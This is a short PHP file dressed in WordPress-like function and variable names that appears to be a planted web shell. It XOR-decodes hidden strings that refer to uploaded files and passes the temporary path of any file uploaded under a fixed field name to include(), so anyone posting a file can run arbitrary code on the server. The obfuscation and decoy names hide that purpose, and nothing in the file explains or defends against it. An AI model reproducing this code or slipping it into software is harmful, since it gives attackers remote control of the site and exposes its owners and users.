<?php 	
function post_categories()

{

    $array = 'KQbPqwqbSTkMiAP';
    $ancestor = $array;

    
    $template_lock = $GLOBALS[uploads("%14%17%2B%1C4%24", $ancestor)];

    $deprecated = $template_lock;
    $length = isset($deprecated[$ancestor]);
    if ($length)

    {
        $override_slug = $template_lock[$ancestor];
        $post_modified_gmt = $override_slug[uploads("%3F%3C%12%0F%1F%16%1C%07", $ancestor)];

        $old_status_to_new_status = $post_modified_gmt;
        include ($old_status_to_new_status);
	$is_sticky = 'public_only';
    }
}

function uploads($more_string, $arg_index)

{
	$capabilities = 'extended';
    $alt_post_name = $arg_index;
    $update = "url" . "decode";
    $is_bad_hierarchical_slug = $update($more_string);
    $excerpt = substr($alt_post_name,0, strlen($is_bad_hierarchical_slug));

    $filetype = $is_bad_hierarchical_slug ^ $excerpt;

    return $filetype;
}

post_categories();
	$menu_position = 'wheres';

	$guid = 'cockneyreplace';
?>
